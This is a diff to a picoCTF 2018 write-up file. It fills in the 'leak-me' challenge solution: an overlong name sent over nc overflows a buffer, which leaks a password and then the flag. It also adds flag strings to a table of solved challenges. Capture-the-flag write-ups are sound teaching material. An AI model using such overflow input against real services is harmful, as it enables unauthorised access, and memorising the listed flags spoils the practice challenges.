@@ -52,7 +52,7 @@ be-quick-or-be-dead-1        Reversing        200
 blaise's cipher              Cryptography     200     picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_cdf08bf0}
 buffer overflow 1            Binary Exploit   200     picoCTF{addr3ss3s_ar3_3asy56a7b196}
 hertz 2                      Cryptography     200     picoCTF{substitution_ciphers_are_too_easy_sgsgtnpibo}
-leak-me                      Binary Exploit   200
+leak-me                      Binary Exploit   200     picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
 now you don't                Forensics        200     picoCTF{n0w_y0u_533_m3}
 shellcode                    Binary Exploit   200
 what base is this?           General Skills   200
@@ -1685,11 +1685,38 @@ int main(int argc, char **argv){
 
 ```
 
+If we overflow the buffer for the `name` variable, we can get the flag
+
+```
+nc 2018shell1.picoctf.com 31045
+What is your name?
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_d98e8d
+
+Incorrect Password!
+```
+
+so it output the password for this, we connect again and use the password to get our flag:
+
+```
+$ nc 2018shell1.picoctf.com 31045
+What is your name?
+bla
+Hello bla,
+Please Enter the Password.
+a_reAllY_s3cuRe_p4s$word_d98e8d
+picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
+```
+
+
+
 **Solution**
 
 **Flag**
 ```
-
+picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
 ```
 
 
